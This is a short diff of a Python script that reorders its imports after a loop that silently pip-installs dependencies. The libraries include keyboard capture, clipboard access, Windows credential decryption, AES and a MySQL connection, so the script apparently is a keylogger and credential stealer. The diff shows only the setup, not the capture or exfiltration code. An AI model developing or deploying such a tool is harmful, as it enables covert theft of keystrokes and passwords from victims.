@@ -1,20 +1,6 @@
 import subprocess
 import os
 import platform
-import time
-
-import mysql.connector
-from pynput import keyboard
-from datetime import datetime
-from threading import Timer
-import pyperclip  # This module is used for clipboard operations
-import socket
-import base64
-import json
-import psutil
-import win32crypt
-from Crypto.Cipher import AES
-from datetime import timezone, datetime, timedelta
 
 # Check and install required modules
 required_modules = ['pynput', 'mysql-connector-python', 'pyperclip', 'psutil','pycryptodome','pywin32']
@@ -24,6 +10,20 @@ for module in required_modules:
         __import__(module)
     except ImportError:
         subprocess.call([os.sys.executable, "-m", "pip", "install", module])
+
+import time
+import mysql.connector
+from pynput import keyboard
+from datetime import datetime
+from threading import Timer
+import pyperclip  # This module is used for clipboard operations
+import socket
+import base64
+import json
+import psutil
+# import win32crypt
+from Crypto.Cipher import AES
+from datetime import timezone, datetime, timedelta
 
 # Connect to MySQL database
 db = mysql.connector.connect(
